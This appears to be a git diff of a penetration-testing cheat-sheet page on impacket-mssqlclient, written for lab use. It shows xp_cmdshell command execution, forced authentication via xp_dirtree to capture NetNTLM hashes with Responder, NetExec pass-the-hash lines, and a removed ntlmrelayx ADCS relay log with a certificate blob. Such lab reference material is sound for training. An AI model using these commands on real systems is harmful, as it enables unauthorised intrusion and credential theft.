@@ -7,13 +7,21 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/mssqlclient.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+Replace UPPER_CASE values with your lab values.
 
-## Current operation: Connect using a domain identity
+[Search this tool’s saved examples](/commands/notebook?tool=mssqlclient) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Connect using a domain identity
 
 **Run in:** Kali. **Requires:** Reachable SQL Server and a domain account accepted by that instance; password is prompted.
 
@@ -21,83 +29,9 @@ import { PreservedNotes } from "/snippets/preserved-notes.jsx";
 impacket-mssqlclient -windows-auth 'DOMAIN/USER@TARGET_IP'
 ```
 
-**Read the result:** First distinguish SQL authentication from Windows authentication, then read the server, database and effective login.
-
-**If Login succeeds but a query is denied:** A database login does not imply sysadmin, impersonation rights, linked-server access or operating-system execution.
+**What the result establishes:** First distinguish SQL authentication from Windows authentication, then read the server, database and effective login.
 
 **Next check:** Inspect SYSTEM_USER, database membership and the exact object permission before attempting OS actions.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## mssqlclient.py: choose the operation and read the result
-
-Connect to Microsoft SQL Server. Choose SQL login or Windows authentication.
-
-### What the result establishes
-
-First distinguish SQL authentication from Windows authentication, then read the server, database and effective login.
-
-### Prerequisites and common failures
-
-A database login does not imply sysadmin, impersonation rights, linked-server access or operating-system execution.
-
-### Example 1: SQL login — password prompted
-
-Run in: **Kali**.
-
-```bash
-impacket-mssqlclient 'USER@TARGET_IP'
-```
-
-### Example 2: Domain account — password prompted
-
-Run in: **Kali**.
-
-```bash
-impacket-mssqlclient -windows-auth 'DOMAIN/USER@TARGET_IP'
-```
-
-### Example 3: Inside the SQL prompt
-
-Run in: **MSSQL prompt**.
-
-```sql
-help
-SELECT SYSTEM_USER;
-SELECT IS_SRVROLEMEMBER('sysadmin');
-SELECT name FROM sys.databases;
-```
-
-### Example 4: OS command — requires appropriate SQL privileges
-
-Run in: **Impacket SQL prompt**. Enables xp_cmdshell on the server.
-
-```text
-enable_xp_cmdshell
-xp_cmdshell whoami
-```
-
-**Login failed** — Confirm SQL authentication versus Windows authentication. Use -windows-auth for the domain account form; verify the SQL instance and port.
-
-**xp_cmdshell permission denied** — A SQL login does not imply sysadmin or OS command execution rights. Check the role query before trying the optional command-execution block.
-
-## Saved commands and notebook recipes
-
-Connect to Microsoft SQL Server. Choose SQL login or Windows authentication.
-
-Replace UPPER_CASE values with your lab values.
-
-[Search this tool’s saved examples](/commands/notebook?tool=mssqlclient) · [All tools](/index)
 
 ## SQL login — password prompted
 
@@ -106,28 +40,6 @@ Replace UPPER_CASE values with your lab values.
 ```bash
 impacket-mssqlclient 'USER@TARGET_IP'
 ```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Example 1: SQL login — password prompted](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-1-sql-login-—-password-prompted) · [Impacket: Script Quick Reference — Example 1: SQL login — password prompted](/tools/impacket#example-1-sql-login-—-password-prompted)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-## Domain account — password prompted
-
-**Kali**
-
-```bash
-impacket-mssqlclient -windows-auth 'DOMAIN/USER@TARGET_IP'
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Example 2: Domain account — password prompted](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-2-domain-account-—-password-prompted) · [Impacket: Script Quick Reference — Example 2: Domain account — password prompted](/tools/impacket#example-2-domain-account-—-password-prompted)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
 
 ## Inside the SQL prompt
 
@@ -140,13 +52,6 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 SELECT name FROM sys.databases;
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Example 3: Inside the SQL prompt](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-3-inside-the-sql-prompt) · [Impacket: Script Quick Reference — Example 3: Inside the SQL prompt](/tools/impacket#example-3-inside-the-sql-prompt)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 ## OS command — requires appropriate SQL privileges
 
 **Impacket SQL prompt**
@@ -156,27 +61,19 @@ enable_xp_cmdshell
 xp_cmdshell whoami
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Example 4: OS command — requires appropriate SQL privileges](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-4-os-command-—-requires-appropriate-sql-privileges) · [Impacket: Script Quick Reference — Example 4: OS command — requires appropriate SQL privileges](/tools/impacket#example-4-os-command-—-requires-appropriate-sql-privileges)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 Enables xp_cmdshell on the server.
 
 ## If it fails
 
 | Symptom | Check |
 | --- | --- |
+| Login succeeds but a query is denied | A database login does not imply sysadmin, impersonation rights, linked-server access or operating-system execution. |
 | Login failed | Confirm SQL authentication versus Windows authentication. Use -windows-auth for the domain account form; verify the SQL instance and port. |
 | xp_cmdshell permission denied | A SQL login does not imply sysadmin or OS command execution rights. Check the role query before trying the optional command-execution block. |
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
-
 ## Notebook recipes
 
-25 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+16 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -305,7 +202,7 @@ xp_cmdshell dir C:\Users
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — MSSQL](/enumeration/footprinting-lab-methodology-cheat-sheet#mssql) · [Microsoft SQL Server Enumeration — Example 4: MSSQL](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-4-mssql)
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — MSSQL](/enumeration/footprinting-lab-methodology-cheat-sheet#mssql)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -336,7 +233,7 @@ smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+**Original note sections:** [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -360,36 +257,6 @@ impacket-mssqlclient <DOMAIN_or_HOST>/<user>:<password>@<IP> -windows-auth
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Microsoft SQL Server Enumeration**
-
-Context from the notebook: USE &lt;db>; Switch database
-
-```text
-USE <db>;
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Microsoft SQL Server Enumeration**
-
-Context from the notebook: SELECT * FROM &lt;table>; Read a table
-
-```text
-SELECT * FROM <table>;
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -441,21 +308,6 @@ EXEC xp_cmdshell 'whoami';
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**Microsoft SQL Server Enumeration**
-
-Context from the notebook: (Impacket exposes shortcuts:  enable_xp_cmdshell  then  xp_cmdshell whoami .)
-
-```text
-xp_cmdshell whoami
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — From DB access to OS command execution](/enumeration/mssql-microsoft-sql-server-cheat-sheet#from-db-access-to-os-command-execution)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 </Accordion>
 
 <Accordion title="When you don&#x27;t have sysadmin: steal the service account&#x27;s hash with xp_dirtree">
@@ -472,7 +324,7 @@ sudo responder -I tun0                 # capture the NetNTLM hash to crack offli
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree) · [Responder — Interface and Startup — Example 7: When you don't have sysadmin: steal the service account's hash with xp_dirtree](/tools/responder#example-7-when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
+**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -491,17 +343,38 @@ EXEC xp_dirtree '\\<your-IP>\share', 1, 1;
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
-**Microsoft SQL Server Enumeration**
+</Accordion>
 
-Context from the notebook: You then either  crack  the captured NetNTLM hash offline ( hashcat -m 5600 ) or  relay  it with  ntlmrelayx  to authenticate to another host the service account can access — no cracking required. This is the standard escape hatch when the login isn't sysadmin.
+<Accordion title="Commands">
 
-```text
-hashcat -m 5600
+### Commands
+
+**NetExec / nxc**
+
+```bash
+nxc smb TARGET_IP -u USER -p 'PASSWORD' --shares
+nxc smb TARGET_IP -u USER -H NT_HASH
+nxc winrm TARGET_IP -u USER -p 'PASSWORD'
+nxc mssql TARGET_IP -u USER -p 'PASSWORD'
+```
+
+</Accordion>
+
+<Accordion title="Follow the service you discovered">
+
+### Follow the service you discovered
+
+**NetExec: Authentication and Enumeration**
+
+```bash
+nxc winrm TARGET_IP -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD'
+nxc mssql TARGET_IP -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD'
+nxc ldap DC_FQDN -d DOMAIN_FQDN -u USERNAME -p 'PASSWORD' --users
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
+**Original note sections:** [NetExec: Authentication and Enumeration — Follow the service you discovered](/tools/netexec#follow-the-service-you-discovered)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -613,243 +486,24 @@ Password:
 
 </Accordion>
 
-<Accordion title="Group &amp; access edges">
+<Accordion title="SNMP and databases">
 
-### Group & access edges
+### SNMP and databases
 
-**BloodHound: Full Reference**
+**Recon & Services: Enumeration Methodology**
 
-Context from the notebook: SQLAdmin You're sysadmin on MSSQL mssqlclient -windows-auth ;  xp_cmdshell  /  enable_xp_cmdshell
+```bash
+# Use a community string known or explicitly being tested in the lab.
+snmpwalk -v2c -c LAB_COMMUNITY "$TARGET_IP" 1.3.6.1.2.1.1
 
-```text
-mssqlclient -windows-auth
+# Interactive database access with a supplied identity.
+mysql -h "$TARGET_IP" -P 3306 -u student -p
+impacket-mssqlclient 'LAB/student@10.129.10.10' -windows-auth
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [BloodHound: Full Reference — Group & access edges](/cheatsheets/bloodhound-complete-guide#group-&-access-edges)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Initiation of the Attack">
-
-### Initiation of the Attack
-
-**Common Services: Full Module Reference**
-
-Context from the notebook: impacket-mssqlclient — built-in helper commands.  Connected with  mssqlclient.py user:pass@IP -windows-auth ? Type  help  to see these shortcuts (they wrap the T-SQL above):
-
-```text
-mssqlclient.py user:pass@IP -windows-auth
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Common Services: Full Module Reference — Initiation of the Attack](/modules/common-services/full-reference#initiation-of-the-attack-2)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Impacket: Script Quick Reference">
-
-### Impacket: Script Quick Reference
-
-**Impacket: Script Quick Reference**
-
-Context from the notebook: MSSQL mssqlclient.py  /  impacket-mssqlclient Database connection
-
-```text
-mssqlclient.py
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Default system databases">
-
-### Default system databases
-
-**Microsoft SQL Server Enumeration**
-
-Context from the notebook: The data  you  want is in the non-default databases —  SELECT name FROM sys.databases;  and ignore the five above.
-
-```text
-SELECT name FROM sys.databases;
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Microsoft SQL Server Enumeration — Default system databases](/enumeration/mssql-microsoft-sql-server-cheat-sheet#default-system-databases) · [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="NetExec (the multi-protocol workhorse)">
-
-### NetExec (the multi-protocol workhorse)
-
-**Password Attacks: Cracking, Files, and Credential Stores**
-
-Context from the notebook: Supports  nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc . Used for spraying, brute-forcing, share enumeration, hash dumping, and more.
-
-```text
-nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — NetExec (the multi-protocol workhorse)](/password-attacks/password-attacks-cheat-sheet#netexec-the-multi-protocol-workhorse)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Database Protocols">
-
-### Database Protocols
-
-**Ports, Protocols, and Services by Purpose**
-
-Context from the notebook: MSSQL 1433 mssqlclient.py &lt;user>@&lt;IP> -windows-auth
-
-```text
-mssqlclient.py <user>@<IP> -windows-auth
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Database Protocols](/reference/master-protocol-service-quick-reference#database-protocols)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Catching Base64 Encoded Certificate for DC01">
-
-### Catching Base64 Encoded Certificate for DC01
-
-**Historical AD Vulnerability Labs · older reference**
-
-```shellsession
-grcic550@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
-
-Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
-
-[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
-[*] Protocol Client DCSYNC loaded..
-[*] Protocol Client HTTPS loaded..
-[*] Protocol Client HTTP loaded..
-[*] Protocol Client IMAP loaded..
-[*] Protocol Client IMAPS loaded..
-[*] Protocol Client LDAPS loaded..
-[*] Protocol Client LDAP loaded..
-[*] Protocol Client MSSQL loaded..
-[*] Protocol Client RPC loaded..
-[*] Protocol Client SMB loaded..
-[*] Protocol Client SMTP loaded..
-[+] Protocol Attack DCSYNC loaded..
-[+] Protocol Attack HTTP loaded..
-[+] Protocol Attack HTTPS loaded..
-[+] Protocol Attack IMAP loaded..
-[+] Protocol Attack IMAPS loaded..
-[+] Protocol Attack LDAP loaded..
-[+] Protocol Attack LDAPS loaded..
-[+] Protocol Attack MSSQL loaded..
-[+] Protocol Attack RPC loaded..
-[+] Protocol Attack SMB loaded..
-[*] Running in relay mode to single host
-[*] Setting up SMB Server
-[*] Setting up HTTP Server
-[*] Setting up WCF Server
-
-[*] Servers started, waiting for connections
-[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
-[*] HTTP server returned error code 200, treating as a successful login
-[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
-[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
-[*] HTTP server returned error code 200, treating as a successful login
-[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
-[*] Generating CSR...
-[*] CSR generated!
-[*] Getting certificate...
-[*] GOT CERTIFICATE!
-[*] Base64 certificate of user ACADEMY-EA-DC01$:
-MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQItd0rgWuhmI0CAggAgIIIWAvQEknxhpJWLyXiVGcJcDVCquWE6Ixzn86jywWY4HdhG624zmBgJKXB6OVV9bRODMejBhEoLQQ+jMVNrNoj3wxg6z/QuWp2pWrXS9zwt7bc1SQpMcCjfiFalKIlpPQQiti7xvTMokV+X6YlhUokM9yz3jTAU0ylvw82LoKsKMCKVx0mnhVDUlxR+i1Irn4piInOVfY0c2IAGDdJViVdXgQ7njtkg0R+Ab0CWrqLCtG6nVPIJbxFE5O84s+P3xMBgYoN4cj/06whmVPNyUHfKUbe5ySDnTwREhrFR4DE7kVWwTvkzlS0K8Cqoik7pUlrgIdwRUX438E+bhix+NEa+fW7+rMDrLA4gAvg3C7O8OPYUg2eR0Q+2kN3zsViBQWy8fxOC39lUibxcuow4QflqiKGBC6SRaREyKHqI3UK9sUWufLi7/gAUmPqVeH/JxCi/HQnuyYLjT+TjLr1ATy++GbZgRWT+Wa247voHZUIGGroz8GVimVmI2eZTl1LCxtBSjWUMuP53OMjWzcWIs5AR/4sagsCoEPXFkQodLX+aJ+YoTKkBxgXa8QZIdZn/PEr1qB0FoFdCi6jz3tkuVdEbayK4NqdbtX7WXIVHXVUbkdOXpgThcdxjLyakeiuDAgIehgFrMDhmulHhpcFc8hQDle/W4e6zlkMKXxF4C3tYN3pEKuY02FFq4d6ZwafUbBlXMBEnX7mMxrPyjTsKVPbAH9Kl3TQMsJ1Gg8F2wSB5NgfMQvg229HvdeXmzYeSOwtl3juGMrU/PwJweIAQ6IvCXIoQ4x+kLagMokHBholFDe9erRQapU9f6ycHfxSdpn7WXvxXlZwZVqxTpcRnNhYGr16ZHe3k4gKaHfSLIRst5OHrQxXSjbREzvj+NCHQwNlq2MbSp8DqE1DGhjEuv2TzTbK9Lngq/iqF8KSTLmqd7wo2OC1m8z9nrEP5C+zukMVdN02mObtyBSFt0VMBfb9GY1rUDHi4wPqxU0/DApssFfg06CNuNyxpTOBObvicOKO2IW2FQhiHov5shnc7pteMZ+r3RHRNHTPZs1I5Wyj/KOYdhcCcVtPzzTDzSLkia5ntEo1Y7aprvCNMrj2wqUjrrq+pVdpMeUwia8FM7fUtbp73xRMwWn7Qih0fKzS3nxZ2/yWPyv8GN0l1fOxGR6iEhKqZfBMp6padIHHIRBj9igGlj+D3FPLqCFgkwMmD2eX1qVNDRUVH26zAxGFLUQdkxdhQ6dY2BfoOgn843Mw3EOJVpGSTudLIhh3KzAJdb3w0k1NMSH3ue1aOu6k4JUt7tU+oCVoZoFBCr+QGZWqwGgYuMiq9QNzVHRpasGh4XWaJV8GcDU05/jpAr4zdXSZKove92gRgG2VBd2EVboMaWO3axqzb/JKjCN6blvqQTLBVeNlcW1PuKxGsZm0aigG/Upp8I/uq0dxSEhZy4qvZiAsdlX50HExuDwPelSV4OsIMmB5myXcYohll/ghsucUOPKwTaoqCSN2eEdj3jIuMzQt40A1ye9k4pv6eSwh4jI3EgmEskQjir5THsb53Htf7YcxFAYdyZa9k9IeZR3IE73hqTdwIcXjfXMbQeJ0RoxtywHwhtUCBk+PbNUYvZTD3DfmlbVUNaE8jUH/YNKbW0kKFeSRZcZl5ziwTPPmII4R8amOQ9Qo83bzYv9Vaoo1TYhRGFiQgxsWbyIN/mApIR4VkZRJTophOrbn2zPfK6AQ+BReGn+eyT1N/ZQeML9apmKbGG2N17QsgDy9MSC1NNDE/VKElBJTOk7YuximBx5QgFWJUxxZCBSZpynWALRUHXJdF0wg0xnNLlw4Cdyuuy/Af4eRtG36XYeRoAh0v64BEFJx10QLoobVu4q6/8T6w5Kvcxvy3k4a+2D7lPeXAESMtQSQRdnlXWsUbP5v4bGUtj5k7OPqBhtBE4Iy8U5Qo6KzDUw+e5VymP+3B8c62YYaWkUy19tLRqaCAu3QeLleI6wGpqjqXOlAKv/BO1TFCsOZiC3DE7f+jg1Ldg6xB+IpwQur5tBrFvfzc9EeBqZIDezXlzKgNXU5V+Rxss2AHc+JqHZ6Sp1WMBqHxixFWqE1MYeGaUSrbHz5ulGiuNHlFoNHpapOAehrpEKIo40Bg7USW6Yof2Az0yfEVAxz/EMEEIL6jbSg3XDbXrEAr5966U/1xNidHYSsng9U4V8b30/4fk/MJWFYK6aJYKL1JLrssd7488LhzwhS6yfiR4abcmQokiloUe0+35sJ+l9MN4Vooh+tnrutmhc/ORG1tiCEn0Eoqw5kWJVb7MBwyASuDTcwcWBw5g0wgKYCrAeYBU8CvZHsXU8HZ3Xp7r1otB9JXqKNb3aqmFCJN3tQXf0JhfBbMjLuMDzlxCAAHXxYpeMko1zB2pzaXRcRtxb8P6jARAt7KO8jUtuzXdj+I9g0v7VCm+xQKwcIIhToH/10NgEGQU3RPeuR6HvZKychTDzCyJpskJEG4fzIPdnjsCLWid8MhARkPGciyXYdRFQ0QDJRLk9geQnPOUFFcVIaXuubPHP0UDCssS7rEIVJUzEGexpHSr01W+WwdINgcfHTbgbPyUOH9Ay4gkDFrqckjX3p7HYMNOgDCNS5SY46ZSMgMJDN8G5LIXLOAD0SIXXrVwwmj5EHivdhAhWSV5Cuy8q0Cq9KmRuzzi0Td1GsHGss9rJm2ZGyc7lSyztJJLAH3q0nUc+pu20nqCGPxLKCZL9FemQ4GHVjT4lfPZVlH1ql5Kfjlwk/gdClx80YCma3I1zpLlckKvW8OzUAVlBv5SYCu+mHeVFnMPdt8yIPi3vmF3ZeEJ9JOibE+RbVL8zgtLljUisPPcXRWTCCCcEGCSqGSIb3DQEHAaCCCbIEggmuMIIJqjCCCaYGCyqGSIb3DQEMCgECoIIJbjCCCWowHAYKKoZIhvcNAQwBAzAOBAhCDya+UdNdcQICCAAEgglI4ZUow/ui/l13sAC30Ux5uzcdgaqR7LyD3fswAkTdpmzkmopWsKynCcvDtbHrARBT3owuNOcqhSuvxFfxP306aqqwsEejdjLkXp2VwF04vjdOLYPsgDGTDxggw+eX6w4CHwU6/3ZfzoIfqtQK9Bum5RjByKVehyBoNhGy9CVvPRkzIL9w3EpJCoN5lOjP6Jtyf5bSEMHFy72ViUuKkKTNs1swsQmOxmCa4w1rXcOKYlsM/Tirn/HuuAH7lFsN4uNsnAI/mgKOGOOlPMIbOzQgXhsQu+Icr8LM4atcCmhmeaJ+pjoJhfDiYkJpaZudSZTr5e9rOe18QaKjT3Y8vGcQAi3DatbzxX8BJIWhUX9plnjYU4/1gC20khMM6+amjer4H3rhOYtj9XrBSRkwb4rW72Vg4MPwJaZO4i0snePwEHKgBeCjaC9pSjI0xlUNPh23o8t5XyLZxRr8TyXqypYqyKvLjYQd5U54tJcz3H1S0VoCnMq2PRvtDAukeOIr4z1T8kWcyoE9xu2bvsZgB57Us+NcZnwfUJ8LSH02Nc81qO2S14UV+66PH9Dc+bs3D1Mbk+fMmpXkQcaYlY4jVzx782fN9chF90l2JxVS+u0GONVnReCjcUvVqYoweWdG3SON7YC/c5oe/8DtHvvNh0300fMUqK7TzoUIV24GWVsQrhMdu1QqtDdQ4TFOy1zdpct5L5u1h86bc8yJfvNJnj3lvCm4uXML3fShOhDtPI384eepk6w+Iy/LY01nw/eBm0wnqmHpsho6cniUgPsNAI9OYKXda8FU1rE+wpB5AZ0RGrs2oGOU/IZ+uuhzV+WZMVv6kSz6457mwDnCVbor8S8QP9r7b6gZyGM29I4rOp+5Jyhgxi/68cjbGbbwrVupba/acWVJpYZ0Qj7Zxu6zXENz5YBf6e2hd/GhreYb7pi+7MVmhsE+V5Op7upZ7U2MyurLFRY45tMMkXl8qz7rmYlYiJ0fDPx2OFvBIyi/7nuVaSgkSwozONpgTAZw5IuVp0s8LgBiUNt/MU+TXv2U0uF7ohW85MzHXlJbpB0Ra71py2jkMEGaNRqXZH9iOgdALPY5mksdmtIdxOXXP/2A1+d5oUvBfVKwEDngHsGk1rU+uIwbcnEzlG9Y9UPN7i0oWaWVMk4LgPTAPWYJYEPrS9raV7B90eEsDqmWu0SO/cvZsjB+qYWz1mSgYIh6ipPRLgI0V98a4UbMKFpxVwK0rF0ejjOw/mf1ZtAOMS/0wGUD1oa2sTL59N+vBkKvlhDuCTfy+XCa6fG991CbOpzoMwfCHgXA+ZpgeNAM9IjOy97J+5fXhwx1nz4RpEXi7LmsasLxLE5U2PPAOmR6BdEKG4EXm1W1TJsKSt/2piLQUYoLo0f3r3ELOJTEMTPh33IA5A5V2KUK9iXy/x4bCQy/MvIPh9OuSs4Vjs1S21d8NfalmUiCisPi1qDBVjvl1LnIrtbuMe+1G8LKLAerm57CJldqmmuY29nehxiMhb5EO8D5ldSWcpUdXeuKaFWGOwlfoBdYfkbV92Nrnk6eYOTA3GxVLF8LT86hVTgog1l/cJslb5uuNghhK510IQN9Za2pLsd1roxNTQE3uQATIR3U7O4cT09vBacgiwA+EMCdGdqSUK57d9LBJIZXld6NbNfsUjWt486wWjqVhYHVwSnOmHS7d3t4icnPOD+6xpK3LNLs8ZuWH71y3D9GsIZuzk2WWfVt5R7DqjhIvMnZ+rCWwn/E9VhcL15DeFgVFm72dV54atuv0nLQQQD4pCIzPMEgoUwego6LpIZ8yOIytaNzGgtaGFdc0lrLg9MdDYoIgMEDscs5mmM5JX+D8w41WTBSPlvOf20js/VoOTnLNYo9sXU/aKjlWSSGuueTcLt/ntZmTbe4T3ayFGWC0wxgoQ4g6No/xTOEBkkha1rj9ISA+DijtryRzcLoT7hXl6NFQWuNDzDpXHc5KLNPnG8KN69ld5U+j0xR9D1Pl03lqOfAXO+y1UwgwIIAQVkO4G7ekdfgkjDGkhJZ4AV9emsgGbcGBqhMYMfChMoneIjW9doQO/rDzgbctMwAAVRl4cUdQ+P/s0IYvB3HCzQBWvz40nfSPTABhjAjjmvpGgoS+AYYSeH3iTx+QVD7by0zI25+Tv9Dp8p/G4VH3H9VoU3clE8mOVtPygfS3ObENAR12CwnCgDYp+P1+wOMB/jaItHd5nFzidDGzOXgq8YEHmvhzj8M9TRSFf+aPqowN33V2ey/O418rsYIet8jUH+SZRQv+GbfnLTrxIF5HLYwRaJf8cjkN80+0lpHYbM6gbStRiWEzj9ts1YF4sDxA0vkvVH+QWWJ+fmC1KbxWw9E2oEfZsVcBX9WIDYLQpRF6XZP9B1B5wETbjtoOHzVAE8zd8DoZeZ0YvCJXGPmWGXUYNjx+fELC7pANluqMEhPG3fq3KcwKcMzgt/mvn3kgv34vMzMGeB0uFEv2cnlDOGhWobCt8nJr6b/9MVm8N6q93g4/n2LI6vEoTvSCEBjxI0fs4hiGwLSe+qAtKB7HKc22Z8wWoWiKp7DpMPA/nYMJ5aMr90figYoC6i2jkOISb354fTW5DLP9MfgggD23MDR2hK0DsXFpZeLmTd+M5Tbpj9zYI660KvkZHiD6LbramrlPEqNu8hge9dpftGTvfTK6ZhRkQBIwLQuHel8UHmKmrgV0NGByFexgE+v7Zww4oapf6viZL9g6IA1tWeH0ZwiCimOsQzPsv0RspbN6RvrMBbNsqNUaKrUEqu6FVtytn